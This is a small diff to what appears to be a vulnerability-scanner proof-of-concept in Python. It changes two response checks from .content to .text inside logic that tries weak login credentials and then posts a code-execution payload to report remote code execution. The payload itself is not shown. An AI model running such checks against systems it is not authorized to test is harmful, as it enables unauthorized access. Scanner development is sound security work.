@@ -55,7 +55,7 @@ class Poc(ABPoc):
                 path=path, up=post_data))
             response = s.post(path, data=post_data)
 
-            if response.content == '1':
+            if response.text == '1':
                 # self.output.warn: 扫描特定漏洞发现的疑似漏洞信息打印
                 self.output.warn(self.vuln['auth'],
                                  '发现弱口令 {up}'.format(up=post_data))
@@ -65,7 +65,7 @@ class Poc(ABPoc):
                     '发送 payload={0} 到 {1}'.format(code_exec, path))
                 result = s.post(path, data=code_exec)
 
-                if 'vuln' in result.content:
+                if 'vuln' in result.text:
                     # self.output.report: 扫描到的漏洞信息的打印
                     self.output.report(
                         self.vuln['rce'],
